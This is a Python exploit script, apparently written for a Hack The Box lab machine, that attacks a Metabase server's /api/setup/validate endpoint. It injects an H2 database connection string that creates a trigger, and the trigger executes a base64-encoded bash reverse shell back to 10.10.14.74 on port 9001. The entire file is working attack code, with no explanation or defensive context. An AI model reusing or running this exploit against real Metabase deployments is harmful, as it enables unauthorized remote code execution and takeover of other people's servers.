import requests
import base64
import json

url = 'http://data.analytical.htb'
endpoint = '/api/setup/validate'

payload = b'/bin/sh -i >& /dev/tcp/10.10.14.74/9001 0>&1\n'
payload = base64.b64encode(payload).decode()

data = {
    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",
    "details": {
        "is_on_demand": False,
        "is_full_sync": False,
        "is_sample": False,
        "cache_ttl": None,
        "refingerprint": False,
        "auto_run_queries": False,
        "schedules": {},
        "details": {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,{" + payload + "}}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": False,
            "ssl": True
        },
        "name": "test",
        "engine": "h2"
    }
}

headers = {
    'Accept': 'application/json',
    'Content-Type': 'application/json'
}

response = requests.post(url + endpoint, headers=headers, data=json.dumps(data))
print(response.text)